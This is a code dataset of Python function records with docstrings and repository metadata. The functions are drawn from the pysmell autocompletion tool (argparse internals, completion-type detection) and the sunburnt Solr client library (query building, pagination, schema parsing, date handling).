{"docstring": "# for everything but PARSER args, strip out '--'\n", "func_signal": "def _get_values(self, action, arg_strings):\n", "code": "if action.nargs is not PARSER:\n    arg_strings = [s for s in arg_strings if s != '--']\n\n# optional argument produces a default when not present\nif not arg_strings and action.nargs == OPTIONAL:\n    if action.option_strings:\n        value = action.const\n    else:\n        value = action.default\n    if isinstance(value, basestring):\n        value = self._get_value(action, value)\n        self._check_value(action, value)\n\n# when nargs='*' on a positional, if there were no command-line\n# args, use the default if it is anything other than None\nelif (not arg_strings and action.nargs == ZERO_OR_MORE and\n      not action.option_strings):\n    if action.default is not None:\n        value = action.default\n    else:\n        value = arg_strings\n    self._check_value(action, value)\n\n# single argument or optional argument produces a single value\nelif len(arg_strings) == 1 and action.nargs in [None, OPTIONAL]:\n    arg_string, = arg_strings\n    value = self._get_value(action, arg_string)\n    self._check_value(action, value)\n\n# PARSER arguments convert all values, but check only the first\nelif action.nargs is PARSER:\n    value = list(self._get_value(action, v) for v in arg_strings)\n    self._check_value(action, value[0])\n\n# all other types of nargs produce a list\nelse:\n    value = list(self._get_value(action, v) for v in arg_strings)\n    for v in value:\n        self._check_value(action, v)\n\n# return the converted value\nreturn value", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "# add any missing keyword arguments by checking the container\n", "func_signal": "def __init__(self, container, title=None, description=None, **kwargs):\n", "code": "update = kwargs.setdefault\nupdate('conflict_handler', container.conflict_handler)\nupdate('prefix_chars', container.prefix_chars)\nupdate('argument_default', container.argument_default)\nsuper_init = super(_ArgumentGroup, self).__init__\nsuper_init(description=description, **kwargs)\n\n# group attributes\nself.title = title\nself._group_actions = []\n\n# share most attributes with the container\nself._registries = container._registries\nself._actions = container._actions\nself._option_string_actions = container._option_string_actions\nself._defaults = container._defaults\nself._has_negative_number_optionals = container._has_negative_number_optionals", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "# determine short and long option strings\n", "func_signal": "def _get_optional_kwargs(self, *args, **kwargs):\n", "code": "option_strings = []\nlong_option_strings = []\nfor option_string in args:\n    # error on one-or-fewer-character option strings\n    if len(option_string) < 2:\n        msg = _('invalid option string %r: '\n                'must be at least two characters long')\n        raise ValueError(msg % option_string)\n\n    # error on strings that don't start with an appropriate prefix\n    if not option_string[0] in self.prefix_chars:\n        msg = _('invalid option string %r: '\n                'must start with a character %r')\n        tup = option_string, self.prefix_chars\n        raise ValueError(msg % tup)\n\n    # error on strings that are all prefix characters\n    if not (set(option_string) - set(self.prefix_chars)):\n        msg = _('invalid option string %r: '\n                'must contain characters other than %r')\n        tup = option_string, self.prefix_chars\n        raise ValueError(msg % tup)\n\n    # strings starting with two prefix characters are long options\n    option_strings.append(option_string)\n    if option_string[0] in self.prefix_chars:\n        if option_string[1] in self.prefix_chars:\n            long_option_strings.append(option_string)\n\n# infer destination, '--foo-bar' -> 'foo_bar' and '-x' -> 'x'\ndest = kwargs.pop('dest', None)\nif dest is None:\n    if long_option_strings:\n        dest_option_string = long_option_strings[0]\n    else:\n        dest_option_string = option_strings[0]\n    dest = dest_option_string.lstrip(self.prefix_chars)\n    dest = dest.replace('-', '_')\n\n# return the updated keyword arguments\nreturn dict(kwargs, dest=dest, option_strings=option_strings)", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "# determine function from conflict handler string\n", "func_signal": "def _get_handler(self):\n", "code": "handler_func_name = '_handle_conflict_%s' % self.conflict_handler\ntry:\n    return getattr(self, handler_func_name)\nexcept AttributeError:\n    msg = _('invalid conflict_resolution value: %r')\n    raise ValueError(msg % self.conflict_handler)", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "\"\"\"\nReturn a CompletionOptions instance describing the type of the completion, along with extra parameters.\n\nargs: fullPath -> The full path and filename of the file that is edited\n      origSource -> The source of the edited file (it's probably not saved)\n      lineNo -> The line number the cursor is in, 1-based\n      origCol -> The column number the cursor is in, 0-based\n      base -> The string that will be replaced when the completion is inserted\n      PYSMELLDICT -> The loaded PYSMELLDICT\n\nNote that Vim deletes the \"base\" when a completion is requested so extra trickery must be performed to get it from the source.\n\n\"\"\"\n", "func_signal": "def detectCompletionType(fullPath, origSource, lineNo, origCol, base, PYSMELLDICT, update=True):\n", "code": "AST = getSafeTree(origSource, lineNo)\nif update:\n    currentDict = analyzeFile(fullPath, AST)\n    if currentDict is not None:\n        updatePySmellDict(PYSMELLDICT, currentDict)\norigLineText = origSource.splitlines()[lineNo - 1] # lineNo is 1 based\nleftSide, rightSide = origLineText[:origCol], origLineText[origCol:]\nleftSideStripped = leftSide.lstrip()\n\nisImportCompletion = (leftSideStripped.startswith(\"from \") or leftSideStripped.startswith(\"import \"))\nif isImportCompletion:\n    module = leftSideStripped.split(\" \")[1]\n    if \".\" in module and \" import \" not in leftSideStripped:\n        module, _ = module.rsplit(\".\", 1)\n    showMembers = False\n    if \" import \" in leftSide:\n        showMembers = True\n    return CompletionOptions(Types.MODULE, module=module, showMembers=showMembers)\n\nisAttrLookup = \".\" in leftSide and not isImportCompletion\nisArgCompletion = base.endswith('(') and leftSide.endswith(base)\n\nif isArgCompletion:\n    rindex = None\n    if rightSide.startswith(')'):\n        rindex = -1\n    funcName = None\n    lindex = leftSide.rfind('.') + 1 #rfind will return -1, so with +1 it will be zero\n    funcName = leftSide[lindex:-1].lstrip()\n    if isAttrLookup:\n        return CompletionOptions(Types.METHOD, parents=[], klass=None, name=funcName, rindex=rindex)\n    else:\n        return CompletionOptions(Types.FUNCTION, name=funcName, rindex=rindex)\n\nif isAttrLookup and AST is not None:\n    var = leftSideStripped[:leftSideStripped.rindex('.')]\n    isClassLookup = var == 'self'\n    if isClassLookup:\n        klass, parents = inferClass(fullPath, AST, lineNo, PYSMELLDICT)\n        return CompletionOptions(Types.INSTANCE, klass=klass, parents=parents)\n    else:\n        chain = getChain(leftSideStripped) # strip dot\n        if base and chain.endswith(base):\n            chain = chain[:-len(base)]\n        if chain.endswith('.'):\n            chain = chain[:-1]\n        possibleModule = inferModule(chain, AST, lineNo)\n        if possibleModule is not None:\n            return CompletionOptions(Types.MODULE, module=possibleModule, showMembers=True)\n    klass, parents = inferInstance(fullPath, AST, lineNo, var, PYSMELLDICT)\n    return CompletionOptions(Types.INSTANCE, klass=klass, parents=parents)\n    \n\nreturn CompletionOptions(Types.TOPLEVEL)", "path": "pysmell\\idehelper.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "# if it doesn't start with a prefix, it was meant to be positional\n", "func_signal": "def _parse_optional(self, arg_string):\n", "code": "if not arg_string[0] in self.prefix_chars:\n    return None\n\n# if it's just dashes, it was meant to be positional\nif not arg_string.strip('-'):\n    return None\n\n# if the option string is present in the parser, return the action\nif arg_string in self._option_string_actions:\n    action = self._option_string_actions[arg_string]\n    return action, arg_string, None\n\n# search through all possible prefixes of the option string\n# and all actions in the parser for possible interpretations\noption_tuples = self._get_option_tuples(arg_string)\n\n# if multiple actions match, the option string was ambiguous\nif len(option_tuples) > 1:\n    options = ', '.join(opt_str for _, opt_str, _ in option_tuples)\n    tup = arg_string, options\n    self.error(_('ambiguous option: %s could match %s') % tup)\n\n# if exactly one action matched, this segmentation is good,\n# so return the parsed action\nelif len(option_tuples) == 1:\n    option_tuple, = option_tuples\n    return option_tuple\n\n# if it was not found as an option, but it looks like a negative\n# number, it was meant to be positional\n# unless there are negative-number-like options\nif self._negative_number_matcher.match(arg_string):\n    if not self._has_negative_number_optionals:\n        return None\n\n# it was meant to be an optional but there is no such option\n# in this parser (though it might be a valid option in a subparser)\nreturn None, arg_string, None", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "\"\"\"\nadd_argument(dest, ..., name=value, ...)\nadd_argument(option_string, option_string, ..., name=value, ...)\n\"\"\"\n\n# if no positional args are supplied or only one is supplied and\n# it doesn't look like an option string, parse a positional\n# argument\n", "func_signal": "def add_argument(self, *args, **kwargs):\n", "code": "chars = self.prefix_chars\nif not args or len(args) == 1 and args[0][0] not in chars:\n    kwargs = self._get_positional_kwargs(*args, **kwargs)\n\n# otherwise, we're adding an optional argument\nelse:\n    kwargs = self._get_optional_kwargs(*args, **kwargs)\n\n# if no default was supplied, use the parser-level default\nif 'default' not in kwargs:\n    dest = kwargs['dest']\n    if dest in self._defaults:\n        kwargs['default'] = self._defaults[dest]\n    elif self.argument_default is not None:\n        kwargs['default'] = self.argument_default\n\n# create the action object, and add it to the parser\naction_class = self._pop_action_class(kwargs)\naction = action_class(**kwargs)\nreturn self._add_action(action)", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "# resolve any conflicts\n", "func_signal": "def _add_action(self, action):\n", "code": "self._check_conflict(action)\n\n# add to actions list\nself._actions.append(action)\naction.container = self\n\n# index the action by any option strings it has\nfor option_string in action.option_strings:\n    self._option_string_actions[option_string] = action\n\n# set the flag if any option strings look like negative numbers\nfor option_string in action.option_strings:\n    if self._negative_number_matcher.match(option_string):\n        if not self._has_negative_number_optionals:\n            self._has_negative_number_optionals.append(True)\n\n# return the created action\nreturn action", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "# find all options that conflict with this option\n", "func_signal": "def _check_conflict(self, action):\n", "code": "        confl_optionals = []\n        for option_string in action.option_strings:\n            if option_string in self._option_string_actions:\n                confl_optional = self._option_string_actions[option_string]\n                confl_optionals.append((option_string, confl_optional))\n# resolve any conflicts\n        if confl_optionals:\n            conflict_handler = self._get_handler()\n            conflict_handler(action, confl_optionals)", "path": "pysmell\\argparse.py", "repo_name": "orestis/pysmell", "stars": 260, "license": "None", "language": "python", "size": 722}
{"docstring": "\"\"\" We need to extend ISO syntax (as permitted by the standard) to allow\nfor dates before 0AD and after 9999AD. This is how to parse such a string\"\"\"\n", "func_signal": "def datetime_from_w3_datestring(s):\n", "code": "m = extended_iso_re.match(s)\nif not m:\n    raise ValueError\nd = m.groupdict()\nd['year'] = int(d['year'])\nd['month'] = int(d['month'] or 1)\nd['day'] = int(d['day'] or 1)\nd['hour'] = int(d['hour'] or 0)\nd['minute'] = int(d['minute'] or 0)\nd['fraction'] = d['fraction'] or '0'\nd['second'] = float(\"%s.%s\" % ((d['second'] or '0'), d['fraction']))\ndel d['fraction']\nif d['tzd_sign']:\n    if d['tzd_sign'] == '+':\n        tzd_sign = 1\n    elif d['tzd_sign'] == '-':\n        tzd_sign = -1\n    try:\n        tz_delta = datetime_delta_factory(tzd_sign*int(d['tzd_hour']),\n                                          tzd_sign*int(d['tzd_minute']))\n    except DateTimeRangeError:\n        raise ValueError(e.args[0])\nelse:\n    tz_delta = datetime_delta_factory(0, 0)\ndel d['tzd_sign']\ndel d['tzd_hour']\ndel d['tzd_minute']\ntry:\n    dt = datetime_factory(**d) + tz_delta\nexcept DateTimeRangeError:\n    raise ValueError(e.args[0])\nreturn dt", "path": "sunburnt\\dates.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "\"\"\"Return a single result or slice of results from the query.\n\"\"\"\n# are we already paginated? if so, we'll apply this getitem to the\n# paginated result - else we'll apply it to the whole.\n", "func_signal": "def __getitem__(self, k):\n", "code": "offset = 0 if self.paginator.start is None else self.paginator.start\n\nif isinstance(k, slice):\n    # calculate solr pagination options for the requested slice\n    step = operator.index(k.step) if k.step is not None else 1\n    if step == 0:\n        raise ValueError(\"slice step cannot be zero\")\n    if step > 0:\n        s1 = k.start\n        s2 = k.stop\n        inc = 0\n    else:\n        s1 = k.stop\n        s2 = k.start\n        inc = 1\n\n    if s1 is not None:\n        start = operator.index(s1)\n        if start < 0:\n            start += self.count()\n            start = max(0, start)\n        start += inc\n    else:\n        start = 0\n    if s2 is not None:\n        stop = operator.index(s2)\n        if stop < 0:\n            stop += self.count()\n            stop = max(0, stop)\n        stop += inc\n    else:\n        stop = self.count()\n\n    rows = stop - start\n    if self.paginator.rows is not None:\n        rows = min(rows, self.paginator.rows)\n    rows = max(rows, 0)\n\n    start += offset\n\n    response = self.paginate(start=start, rows=rows).execute()\n    if step != 1:\n        response.result.docs = response.result.docs[::step]\n    return response\n\nelse:\n    # if not a slice, a single result is being requested\n    k = operator.index(k)\n    if k < 0:\n        k += self.count()\n        if k < 0:\n            raise IndexError(\"list index out of range\")\n\n    # Otherwise do the query anyway, don't count() to avoid extra Solr call\n    k += offset\n    response = self.paginate(start=k, rows=1).execute()\n    if response.result.numFound < k:\n        raise IndexError(\"list index out of range\")\n    return response.result.docs[0]", "path": "sunburnt\\search.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "# Python datetime objects may include timezone information\n", "func_signal": "def from_date(dt_obj):\n", "code": "if hasattr(dt_obj, 'tzinfo') and dt_obj.tzinfo:\n    # but Solr requires UTC times.\n    return dt_obj.astimezone(utc).replace(tzinfo=None)\nelse:\n    return dt_obj", "path": "sunburnt\\schema.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "# an example tree\n", "func_signal": "def _tree_example():\n", "code": "root = (\n    ((1,2), (4,5), 6),\n    (7, 9),\n)\n    \n# a function to generates subnodes for this tree\ndef subn(node):\n    return node if isinstance(node, tuple) else ()\n\n# use of the walk() generator to traverse the tree\nfor path in walk(root, subn, event(enter|exit|leaf)):\n    print(list(path), \"{0:<7}\".format(event_repr(path.event)))", "path": "sunburnt\\walktree.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "\"\"\" Check operation of a field type that is unknown to Sunburnt.\n\"\"\"\n", "func_signal": "def test_unknown_field_type(self):\n", "code": "assert 'solr.SpatialRecursivePrefixTreeFieldType' \\\n        not in SolrSchema.solr_data_types\nfield = self.s.fields['location_field']\nassert field\n\n#Boolean attributes are converted accordingly\nassert field.geo == True\n#All other attributes are strings\nassert field.units == 'degrees'\nassert field.distErrPct == '0.025'\nassert field.maxDistErr == '0.000009'\n\n#Test that the value is always consistent - both to and from Solr\nvalue = 'POLYGON ((30 10, 10 20, 20 40, 40 40, 30 10))'\nassert field.to_user_data(value) \\\n        == field.from_user_data(value) \\\n        == field.to_solr(value) \\\n        == field.from_solr(value)\n\n#Queried values will be escaped accordingly\nassert field.to_query(value) == u'POLYGON\\\\ \\\\(\\\\(30\\\\ 10,\\\\ 10\\\\ 20,\\\\ 20\\\\ 40,\\\\ 40\\\\ 40,\\\\ 30\\\\ 10\\\\)\\\\)'", "path": "sunburnt\\test_schema.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "# Is this a dictionary, or an document object, or a thing\n# that can be cast to a uniqueKey? (which could also be an\n# arbitrary object.\n", "func_signal": "def doc_id_from_doc(self, doc):\n", "code": "if isinstance(doc, (basestring, int, long, float)):\n    # It's obviously not a document object, just coerce to appropriate type\n    doc_id = doc\nelif hasattr(doc, \"items\"):\n    # It's obviously a dictionary\n    try:\n        doc_id = doc[self.schema.unique_key]\n    except KeyError:\n        raise SolrError(\"No unique key on this document\")\nelse:\n    doc_id = get_attribute_or_callable(doc, self.schema.unique_key)\n    if doc_id is None:\n        # Well, we couldn't get an ID from it; let's try\n        # coercing the doc to the type of an ID field.\n        doc_id = doc\ntry:\n    doc_id_inst = self.schema.unique_field.instance_from_user_data(doc_id)\nexcept SolrError:\n    raise SolrError(\"Could not parse argument as object or document id\")\nreturn doc_id_inst", "path": "sunburnt\\schema.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "# get the total count for the current query without retrieving any results\n# cache it, since it may be needed multiple times when used with django paginator\n", "func_signal": "def count(self):\n", "code": "if self._count is None:\n    # are we already paginated? then we'll behave as if that's\n    # defined our result set already.\n    if self.paginator.rows is not None:\n        total_results = self.paginator.rows\n    else:\n        response = self.paginate(rows=0).execute()\n        total_results = response.result.numFound\n        if self.paginator.start is not None:\n            total_results -= self.paginator.start\n    self._count = total_results\nreturn self._count", "path": "sunburnt\\search.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "# return a list containing this file, and all files this file includes\n# via xinclude.  And do this recursively to ensure we have all we need.\n", "func_signal": "def get_file_and_included_files(self, filename):\n", "code": "file_list = [filename]\nxinclude_list = self.get_xinclude_list_for_file(filename)\nif xinclude_list is None:\n    # this means we didn't even find the top level file\n    return []\nfor xinclude_node in xinclude_list:\n    included_file = xinclude_node.get('href')\n    file_list += self.get_file_and_included_files(included_file)\nreturn file_list", "path": "sunburnt\\sunburnt.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "# Note: for efficiency's sake this modifies the original dict\n# in place. This doesn't make much difference on 20 documents\n# but it does on 20,000\n", "func_signal": "def parse_result_doc_json(self, doc):\n", "code": "for name, value in doc.viewitems():\n    field_class = self.match_field(name)\n    # If the field type is a string then we don't need to modify it\n    if isinstance(field_class, SolrUnicodeField):\n        continue\n    if field_class is None and name == \"score\":\n        field_class = SolrScoreField()\n    elif field_class is None:\n        raise SolrError(\"unexpected field found in result (field name: %s)\" % name)\n    if isinstance(value, list):\n        parsed_value = [SolrFieldInstance.from_solr(field_class, v).to_user_data() for v in value]\n    else:\n        parsed_value = SolrFieldInstance.from_solr(field_class, value).to_user_data()\n    doc[name] = parsed_value\nreturn doc", "path": "sunburnt\\schema.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "# How many terms in this (sub) query?\n", "func_signal": "def __len__(self):\n", "code": "if len(self.subqueries) == 1:\n    subquery_length = len(self.subqueries[0])\nelse:\n    subquery_length = len(self.subqueries)\nreturn sum([sum(len(v) for v in self.terms.values()),\n            sum(len(v) for v in self.phrases.values()),\n            len(self.ranges),\n            subquery_length])", "path": "sunburnt\\search.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "# shortcut to avoid re-normalization no-ops\n", "func_signal": "def normalize(self):\n", "code": "if self.normalized:\n    return self, False\n\nchanged = False\nfor path in walk(self, lambda q: q.subqueries, event(exit|leaf)):\n    if len(path) == 1:\n        # last time around, so:\n        break\n    this = path[-1]\n    obj = self.normalize_node(this)\n    obj.normalized = True\n    if obj != this:\n        siblings = path[-2].subqueries\n        i = siblings.index(this)\n        siblings[i] = obj\n        changed = True\n\nobj = self.normalize_node(self)\nreturn obj, (changed or obj == self)", "path": "sunburnt\\search.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "\"\"\"initialize a schema object from a\nfilename or file-like object.\"\"\"\n", "func_signal": "def __init__(self, f, format='xml'):\n", "code": "self.format = format\nself.fields, self.dynamic_fields, self.default_field_name, self.unique_key \\\n    = self.schema_parse(f)\nself.default_field = self.fields[self.default_field_name] \\\n    if self.default_field_name else None\nself.unique_field = self.fields[self.unique_key] \\\n    if self.unique_key else None\nself.dynamic_field_cache = {}", "path": "sunburnt\\schema.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "# return a list of xinclude elements in this file\n", "func_signal": "def get_xinclude_list_for_file(self, filename):\n", "code": "file_contents = self.get_file(filename)\nif file_contents is None:\n    return None\nelse:\n    tree = etree.parse(self.get_file(filename))\n    return tree.getroot().findall('{http://www.w3.org/2001/XInclude}include')", "path": "sunburnt\\sunburnt.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "# take the file cache and save to a directory\n", "func_signal": "def save_file_cache(self, dirname):\n", "code": "for filename in self.file_cache:\n    open(path.join(dirname, filename), 'w').write(self.file_cache[filename])", "path": "sunburnt\\sunburnt.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "\"\"\"Perform a MoreLikeThis query using the content specified\nThere may be no content if stream.url is specified in the params.\n\"\"\"\n", "func_signal": "def mlt(self, params, content=None):\n", "code": "if not self.readable:\n    raise TypeError(\"This Solr instance is only for writing\")\nqs = urllib.urlencode(params)\nbase_url = \"%s?%s\" % (self.mlt_url, qs)\nmethod = 'GET'\nkwargs = {}\nif content is None:\n    url = base_url\nelse:\n    get_url = \"%s&stream.body=%s\" % (base_url, urllib.quote_plus(content))\n    if len(get_url) <= self.max_length_get_url:\n        url = get_url\n    else:\n        url = base_url\n        method = 'POST'\n        kwargs = {\n            'data': content,\n            'headers': {\"Content-Type\": \"text/plain; charset=utf-8\"}}\nresponse = self.request(method, url, **kwargs)\nif response.status_code != 200:\n    raise SolrError(response)\nreturn response.content", "path": "sunburnt\\sunburnt.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "\"\"\"Traverse a tree or a graph based at 'node' and generate a sequence\nof paths in the graph from the initial node to the visited node.\nThe arguments are\n\n    @ node : an arbitrary python object used as root node.\n    @ gen_subnodes : a function defining the graph structure. It must\n        have the interface gen_subnodes(node) --> iterable containing\n        other nodes. This function will be called with the initial\n        node and the descendent nodes that it generates through\n        this function.\n    @ event: an integral value specifying which paths will be generated\n        during the depth-first walk. This is usually a value obtained\n        by composing the walk events (see below) with bitwise operators.\n        For example passing event = event(enter|leaf|bounce) will\n        generate inner nodes the first time they are entered, leaf\n        nodes and all the nodes every time they are revisited during\n        the walk.\n    @ reverse_path: a boolean indicating that the path should be read\n        from right to left (defaults to False).\n    @ tree: a boolean indicating that the walked graph is a tree,\n        which means that applying gen_subnodes() will only generate\n        new nodes (defaults to True). Passing True if the graph\n        is not a tree will walk multiple subgraphs several times,\n        or lead to an infinite walk and a memory error if the graph\n        contains cycles. When a False value is given, this function\n        stores all the previoulsy visited nodes during the walk.\n        When a True value is given, only the nodes in the current\n        path are stored.\n\nTypical use:\n    \n    for path in walk(node, func, event(enter|leaf)):\n        # this choice of events results in a preorder traversal\n        visited = path[-1]\n        if path.event & leaf:\n            print(visited, 'is a leaf node!')\n            \nThe generated 'path' is a read-only sequence of nodes with path[0] being\nthe base node of the walk and path[-1] being the visited node. If\nreverse_path is set to True, the path will appear from right to left,\nwith the visited node in position 0. During the whole walk, the function\ngenerates the same path object, each time in a different state.\nInternally, this path is implemented using a collections.deque object,\nwhich means that indexing an element in the middle of the path (but not\nnear both ends) may require a time proportional to its length.\n\nThe generated paths have an attribute path.event which value is an\ninteger in the range [0,128[ representing a bitwise combination of\nthe base events (which are also integers) explained below\n\n    enter:  the currently visited node is an inner node of the tree\n            generated before this node's subgraph is visited.\n    within: the currently visited node is an inner node generated after\n            its first subgraph has been visited but before the other\n            subgraphs.\n    exit:   the currently visited node is an inner node generated after\n            all its subgraphs have been visited.\n    leaf:   the currently visited node is a leaf node.\n    inner:  the currently visited node is an inner node\n    cycle:  the currently visited node is an internal node already on\n            the path, which means that the graph has a cycle. The subgraph\n            based on this node will not be walked.\n    bounce: the currently visited node is either an internal node which\n            subgraph has already been walked, or a leaf already met.\n            Subgraphs are never walked a twice with the argument tree=False.\nThe actual events generated are often a combination of these events, for\nexemple, one may have a value of event(leaf & ~bounce). This attribute\npath.event is best tested with bitwise operators. For example to test if\nthe walk is on a leaf, use 'if path.event & leaf:'.\n\nThe constant events are also attributes of the walk function, namely\n(walk.enter, walk.within, ...)\n\"\"\"\n", "func_signal": "def walk(node, gen_subnodes, event = enter, reverse_path = False, tree=True):\n", "code": "mask, selector = parse_event_arg(event)\nisub = selector.index('', 1)\nileft = selector.index('', isub + 1)\ntcycle = mask & cycle\ntleaf = mask & leaf\ntibounce = mask & bounce & inner\ntfbounce = mask & bounce & leaf\ntffirst = mask & ~bounce & leaf\ntodo = deque((iter((node,)),))\npath = deque()\nconst_path = ConstSequence(path)\nif reverse_path:\n    ppush, ppop, ivisited = path.appendleft, path.popleft, 0\nelse:\n    ppush, ppop, ivisited = path.append, path.pop, -1\nless, more = todo.pop, todo.extend\nhist = _MockDict() if tree else dict()\ntry:\n    while True:\n        sequence = todo[-1]\n        if sequence.__class__ is _Int:\n            less()\n            if sequence is _pop:\n                # this node's subtree is exhausted, prepare for bounce\n                hist[path[ivisited]] = tibounce\n                ppop()\n            else:\n                const_path.event = sequence\n                yield const_path\n        else:\n            try:\n                node = next(sequence)\n            except StopIteration:\n                less()\n            else:\n                ppush(node)\n                # if node in history, generate a bounce event\n                # (actually one of (leaf & bounce, inner & bounce, cycle))\n                if node in hist:\n                    const_path.event = hist[node]\n                    if const_path.event:\n                        yield const_path\n                    ppop()\n                else:\n                    sub = iter(gen_subnodes(node))\n                    try:\n                        snode = next(sub)\n                    except StopIteration:\n                        hist[node] = tfbounce\n                        if tleaf:\n                            const_path.event = tffirst\n                            yield const_path\n                        ppop()\n                    else:\n                        # ajouter node \n                        hist[node] = tcycle\n                        selector[ileft] = iter((snode,))\n                        selector[isub] = sub\n                        more(selector)\nexcept IndexError:\n    if todo: # this allows gen_subnodes() to raise IndexError\n        raise", "path": "sunburnt\\walktree.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "\"\"\" Normalize a query node provided all its sub-queries\nare already normalized\"\"\"\n# Recalculate terms/phrases/ranges/subqueries as appropriate given immediate subqueries\n", "func_signal": "def normalize_node(obj):\n", "code": "terms = [obj.terms]\nphrases = [obj.phrases]\nranges = [obj.ranges]\nsubqueries = []\n\nmutated = False\nfor s in obj.subqueries:\n    if not s:\n        mutated = True # we're dropping a subquery\n        continue # don't append\n    if (s._and and obj._and) or (s._or and obj._or):\n        # then hoist the contents up\n        terms.append(s.terms)\n        phrases.append(s.phrases)\n        ranges.append(s.ranges)\n        subqueries.extend(s.subqueries)\n        mutated = True\n    else: # just keep it unchanged\n        subqueries.append(s)\n\n# and clone if there have been any changes\nif mutated:\n    obj = obj.clone(terms = obj.merge_term_dicts(terms),\n                    phrases = obj.merge_term_dicts(phrases),\n                    ranges = reduce(operator.or_, ranges),\n                    subqueries = subqueries)\n\n# having recalculated subqueries, there may be the opportunity for further normalization, if we have zero or one subqueries left\nif not len(obj.subqueries):\n    if obj._not:\n        obj = obj.clone(_not=False, _and=True)\n    elif obj._pow:\n        obj = obj.clone(_pow=False)\nelif len(obj.subqueries) == 1:\n    if obj._not and obj.subqueries[0]._not:\n        obj = obj.clone(subqueries=obj.subqueries[0].subqueries, _not=False, _and=True)\n    elif (obj._and or obj._or) and not obj.terms and not obj.phrases and not obj.ranges and not obj.boosts:\n        obj = obj.subqueries[0]\nobj.normalized = True\nreturn obj", "path": "sunburnt\\search.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "# Get fields from schema\n", "func_signal": "def object_to_dict(o, schema):\n", "code": "fields = schema.fields.keys()\n# Check if any attributes defined on object match\n# dynamic field patterns\nfields.extend([f for f in dir(o) if schema.match_dynamic_field(f)])\nd = {}\nfor field in fields:\n    value = get_attribute_or_callable(o, field)\n    if value is not None:\n        d[field] = value\nreturn d", "path": "sunburnt\\schema.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "# return remote file as StringIO and cache the contents\n", "func_signal": "def get_file(self, filename):\n", "code": "if filename not in self.file_cache:\n    response = self.conn.request('GET', self.make_file_url(filename))\n    if response.status_code == 200:\n        self.file_cache[filename] = response.content\n    elif response.status_code == 404:\n        return None\n    else:\n        raise EnvironmentError(\"Couldn't retrieve schema document from server - received status code %s\\n%s\" % (response.status_code, content))\nreturn StringIO.StringIO(self.file_cache[filename])", "path": "sunburnt\\sunburnt.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
{"docstring": "# We're not allowing function queries a la Solr1.5\n", "func_signal": "def update(self, field):\n", "code": "if field.startswith('-'):\n    order = \"desc\"\n    field = field[1:]\nelif field.startswith('+'):\n    order = \"asc\"\n    field = field[1:]\nelse:\n    order = \"asc\"\nif field != 'score':\n    f = self.schema.match_field(field)\n    if not f:\n        raise SolrError(\"No such field %s\" % field)\n    elif f.multi_valued:\n        raise SolrError(\"Cannot sort on a multivalued field\")\n    elif not f.indexed:\n        raise SolrError(\"Cannot sort on an un-indexed field\")\nself.fields.append([order, field])", "path": "sunburnt\\search.py", "repo_name": "tow/sunburnt", "stars": 279, "license": "mit", "language": "python", "size": 1035}
